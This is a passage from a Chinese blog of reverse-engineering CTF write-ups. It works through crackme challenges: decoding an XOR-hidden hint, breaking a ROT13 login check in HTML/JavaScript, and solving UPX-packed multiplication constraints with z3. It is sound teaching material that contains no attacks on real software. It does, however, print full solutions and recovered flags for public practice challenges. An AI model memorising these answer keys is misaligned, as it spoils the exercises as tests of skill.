class="number">121</span>, <span class="number">46</span>, <span class="number">105</span>, <span class="number">127</span>, <span class="number">100</span>, <span class="number">96</span>, <span class="number">51</span>, <span class="number">119</span>, <span class="number">125</span>,</span><br><span class="line">             <span class="number">119</span>, <span class="number">101</span>, <span class="number">107</span>, <span class="number">57</span>, <span class="number">123</span>, <span class="number">105</span>, <span class="number">121</span>, <span class="number">61</span>, <span class="number">126</span>, <span class="number">121</span>, <span class="number">76</span>, <span class="number">64</span>, <span class="number">69</span>, <span class="number">67</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(local_str)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> j ^ i == local_str[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#output: Info:The first four chars are `flag`</span></span><br></pre></td></tr></table></figure><p>之后是又一次的输入：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211025195507127.png" alt="image-20211025195507127"></p><p>会base64进行10次后和本地的另一个字符串比较，解密10次后发现这是个假的hint……..</p><p>接下来的一点是我怎么都没想到的，，在字符串的下面有个常量，在另一个函数有调用：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211025200621618.png" alt="image-20211025200621618"></p><p>x查看交叉引用，关键代码：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211026141034428.png" alt="image-20211026141034428"></p><p>输入的第一位和第四位和本地的字符串异或之后要分别为f和g，猜测前4位为flag，后面的是循环异或</p><p>shift+e提取数据，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x35</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x5D</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x62</span>, <span class="number">0x3C</span>, <span class="number">0x27</span>, <span class="number">0x54</span>, <span class="number">0x48</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x3C</span>, <span class="number">0x32</span>, <span class="number">0x45</span>, <span class="number">0x5B</span></span><br><span class="line">]</span><br><span class="line">flag = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">qq = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    qq.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) ^ <span class="built_in">str</span>[i]))</span><br><span class="line"><span class="built_in">print</span>(qq)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    a = <span class="built_in">chr</span>(<span class="built_in">str</span>[i] ^ <span class="built_in">ord</span>(qq[i % <span class="number">4</span>]))</span><br><span class="line">    <span class="built_in">print</span>(a, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="0x09-FlareOn4-login"><a href="#0x09-FlareOn4-login" class="headerlink" title="0x09.[FlareOn4]login"></a>0x09.[FlareOn4]login</h1><p>关键的部分就只有12行的那部分：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Html</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>FLARE On 2017<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Enter the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;prompt&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click to check the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);&#125;);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Correct flag!&quot;</span>);</span></span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其实就是rot13，在if前面把rotflag给输出一下就OK。</p><h1 id="0x0A-GUET-CTF2019-re"><a href="#0x0A-GUET-CTF2019-re" class="headerlink" title="0x0A.[GUET-CTF2019]re"></a>0x0A.[GUET-CTF2019]re</h1><blockquote><p>  考点是z3约束器相关：</p><p>  <a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p></blockquote><p>exeinfope查壳之后发现是upx壳，脱掉之后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">mian</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// er9</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v11[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *&amp;v11[<span class="number">8</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;v11[<span class="number">16</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;v11[<span class="number">24</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input your flag:&quot;</span>, a2, a3, a4, a5, a6);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v11, v6, v7, v8, v9, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( check(v11) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v12 )</span><br><span class="line">    sub_443550();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最关键的就是check那个了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">check</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">1629056</span> * *a1 != <span class="number">166163712</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6771600</span> * a1[<span class="number">1</span>] != <span class="number">731332800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3682944</span> * a1[<span class="number">2</span>] != <span class="number">357245568</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10431000</span> * a1[<span class="number">3</span>] != <span class="number">1074393000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3977328</span> * a1[<span class="number">4</span>] != <span class="number">489211344</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5138336</span> * a1[<span class="number">5</span>] != <span class="number">518971936</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7532250</span> * a1[<span class="number">7</span>] != <span class="number">406741500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5551632</span> * a1[<span class="number">8</span>] != <span class="number">294236496</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3409728</span> * a1[<span class="number">9</span>] != <span class="number">177305856</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13013670</span> * a1[<span class="number">10</span>] != <span class="number">650683500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6088797</span> * a1[<span class="number">11</span>] != <span class="number">298351053</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7884663</span> * a1[<span class="number">12</span>] != <span class="number">386348487</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8944053</span> * a1[<span class="number">13</span>] != <span class="number">438258597</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5198490</span> * a1[<span class="number">14</span>] != <span class="number">249527520</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4544518</span> * a1[<span class="number">15</span>] != <span class="number">445362764</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3645600</span> * a1[<span class="number">17</span>] != <span class="number">174988800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10115280</span> * a1[<span class="number">16</span>] != <span class="number">981182160</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9667504</span> * a1[<span class="number">18</span>] != <span class="number">493042704</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5364450</span> * a1[<span class="number">19</span>] != <span class="number">257493600</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13464540</span> * a1[<span class="number">20</span>] != <span class="number">767478780</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5488432</span> * a1[<span class="number">21</span>] != <span class="number">312840624</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">14479500</span> * a1[<span class="number">22</span>] != <span class="number">1404511500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6451830</span> * a1[<span class="number">23</span>] != <span class="number">316139670</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6252576</span> * a1[<span class="number">24</span>] != <span class="number">619005024</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7763364</span> * a1[<span class="number">25</span>] != <span class="number">372641472</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7327320</span> * a1[<span class="number">26</span>] != <span class="number">373693320</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8741520</span> * a1[<span class="number">27</span>] != <span class="number">498266640</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8871876</span> * a1[<span class="number">28</span>] != <span class="number">452465676</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4086720</span> * a1[<span class="number">29</span>] != <span class="number">208422720</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9374400</span> * a1[<span class="number">30</span>] == <span class="number">515592000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5759124</span> * a1[<span class="number">31</span>] == <span class="number">719890500</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以手动一个一个解，也可z3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">a1 = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    a1[i] = Int(<span class="string">&#x27;a1[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s.add(<span class="number">1629056</span> * a1[<span class="number">0</span>] == <span class="number">166163712</span>)</span><br><span class="line">s.add(<span class="number">6771600</span> * a1[<span class="number">1</span>] == <span class="number">731332800</span>)</span><br><span class="line">s.add(<span class="number">3682944</span> * a1[<span class="number">2</span>] == <span class="number">357245568</span>)</span><br><span class="line">s.add(<span class="number">10431000</span> * a1[<span class="number">3</span>] == <span class="number">1074393000</span>)</span><br><span class="line">s.add(<span class="number">3977328</span> * a1[<span class="number">4</span>] == <span class="number">489211344</span>)</span><br><span class="line">s.add(<span class="number">5138336</span> * a1[<span class="number">5</span>] == <span class="number">518971936</span>)</span><br><span class="line">s.add(<span class="number">7532250</span> * a1[<span class="number">7</span>] == <span class="number">406741500</span>)</span><br><span class="line">s.add(<span class="number">5551632</span> * a1[<span class="number">8</span>] == <span class="number">294236496</span>)</span><br><span class="line">s.add(<span class="number">3409728</span> * a1[<span class="number">9</span>] == <span class="number">177305856</span>)</span><br><span class="line">s.add(<span class="number">13013670</span> * a1[<span class="number">10</span>] == <span class="number">650683500</span>)</span><br><span class="line">s.add(<span class="number">6088797</span> * a1[<span class="number">11</span>] == <span class="number">298351053</span>)</span><br><span class="line">s.add(<span class="number">7884663</span> * a1[<span class="number">12</span>] == <span class="number">386348487</span>)</span><br><span class="line">s.add(<span class="number">8944053</span> * a1[<span class="number">13</span>] == <span class="number">438258597</span>)</span><br><span class="line">s.add(<span class="number">5198490</span> * a1[<span class="number">14</span>] == <span class="number">249527520</span>)</span><br><span class="line">s.add(<span class="number">4544518</span> * a1[<span class="number">15</span>] == <span class="number">445362764</span>)</span><br><span class="line">s.add(<span class="number">3645600</span> * a1[<span class="number">17</span>] == <span class="number">174988800</span>)</span><br><span class="line">s.add(<span class="number">10115280</span> * a1[<span class="number">16</span>] == <span class="number">981182160</span>)</span><br><span class="line">s.add(<span class="number">9667504</span> * a1[<span class="number">18</span>] == <span class="number">493042704</span>)</span><br><span class="line">s.add(<span class="number">5364450</span> * a1[<span class="number">19</span>] == <span class="number">257493600</span>)</span><br><span class="line">s.add(<span class="number">13464540</span> * a1[<span class="number">20</span>] == <span class="number">767478780</span>)</span><br><span class="line">s.add(<span class="number">5488432</span> * a1[<span class="number">21</span>] == <span class="number">312840624</span>)</span><br><span class="line">s.add(<span class="number">14479500</span> * a1[<span class="number">22</span>] == <span class="number">1404511500</span>)</span><br><span class="line">s.add(<span class="number">6451830</span> * a1[<span class="number">23</span>] == <span class="number">316139670</span>)</span><br><span class="line">s.add(<span class="number">6252576</span> * a1[<span class="number">24</span>] == <span class="number">619005024</span>)</span><br><span class="line">s.add(<span class="number">7763364</span> * a1[<span class="number">25</span>] == <span class="number">372641472</span>)</span><br><span class="line">s.add(<span class="number">7327320</span> * a1[<span class="number">26</span>] == <span class="number">373693320</span>)</span><br><span class="line">s.add(<span class="number">8741520</span> * a1[<span class="number">27</span>] == <span class="number">498266640</span>)</span><br><span class="line">s.add(<span class="number">8871876</span> * a1[<span class="number">28</span>] == <span class="number">452465676</span>)</span><br><span class="line">s.add(<span class="number">4086720</span> * a1[<span class="number">29</span>] == <span class="number">208422720</span>)</span><br><span class="line">s.add(<span class="number">9374400</span> * a1[<span class="number">30</span>] == <span class="number">515592000</span>)</span><br><span class="line">s.add(<span class="number">5759124</span> * a1[<span class="number">31</span>] == <span class="number">719890500</span>)</span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[a1[31] = 125,</span><br><span class="line"> a1[30] = 55,</span><br><span class="line"> a1[29] = 51,</span><br><span class="line"> a1[28] = 51,</span><br><span class="line"> a1[27] = 57,</span><br><span class="line"> a1[26] = 51,</span><br><span class="line"> a1[25] = 48,</span><br><span class="line"> a1[24] = 99,</span><br><span class="line"> a1[23] = 49,</span><br><span class="line"> a1[22] = 97,</span><br><span class="line"> a1[21] = 57,</span><br><span class="line"> a1[20] = 57,</span><br><span class="line"> a1[19] = 48,</span><br><span class="line"> a1[18] = 51,</span><br><span class="line"> a1[16] = 97,</span><br><span class="line"> a1[17] = 48,</span><br><span class="line"> a1[15] = 98,</span><br><span class="line"> a1[14] = 48,</span><br><span class="line"> a1[13] = 49,</span><br><span class="line"> a1[12] = 49,</span><br><span class="line"> a1[11] = 49,</span><br><span class="line"> a1[10] = 50,</span><br><span class="line"> a1[9] = 52,</span><br><span class="line"> a1[8] = 53,</span><br><span class="line"> a1[7] = 54,</span><br><span class="line"> a1[5] = 101,</span><br><span class="line"> a1[4] = 123,</span><br><span class="line"> a1[3] = 103,</span><br><span class="line"> a1[2] = 97,</span><br><span class="line"> a1[1] = 108,</span><br><span class="line"> a1[0] = 102]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">a1 = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">a1[<span class="number">31</span>] = <span class="number">125</span></span><br><span class="line">a1[<span class="number">30</span>] = <span class="number">55</span></span><br><span class="line">a1[<span class="number">29</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">28</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">27</span>] = <span class="number">57</span></span><br><span class="line">a1[<span class="number">26</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">25</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">24</span>] = <span class="number">99</span></span><br><span class="line">a1[<span class="number">23</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">22</span>] = <span class="number">97</span></span><br><span class="line">a1[<span class="number">21</span>] = <span class="number">57</span></span><br><span class="line">a1[<span class="number">20</span>] = <span class="number">57</span></span><br><span class="line">a1[<span class="number">19</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">18</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">16</span>] = <span class="number">97</span></span><br><span class="line">a1[<span class="number">17</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">15</span>] = <span class="number">98</span></span><br><span class="line">a1[<span class="number">14</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">13</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">12</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">11</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">10</span>] = <span class="number">50</span></span><br><span class="line">a1[<span class="number">9</span>] = <span class="number">52</span></span><br><span class="line">a1[<span class="number">8</span>] = <span class="number">53</span></span><br><span class="line">a1[<span class="number">7</span>] = <span class="number">54</span></span><br><span class="line">a1[<span class="number">5</span>] = <span class="number">101</span></span><br><span class="line">a1[<span class="number">4</span>] = <span class="number">123</span></span><br><span class="line">a1[<span class="number">3</span>] = <span class="number">103</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">97</span></span><br><span class="line">a1[<span class="number">1</span>] = <span class="number">108</span></span><br><span class="line">a1[<span class="number">0</span>] = <span class="number">102</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">6</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(a1[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里因为6没有，所以只能一个一个试，恰巧第一个就可。</p><h1 id="0x0B-SUCTF2019-SignIn"><a href="#0x0B-SUCTF2019-SignIn" class="headerlink" title="0x0B.[SUCTF2019]SignIn"></a>0x0B.[SUCTF2019]SignIn</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 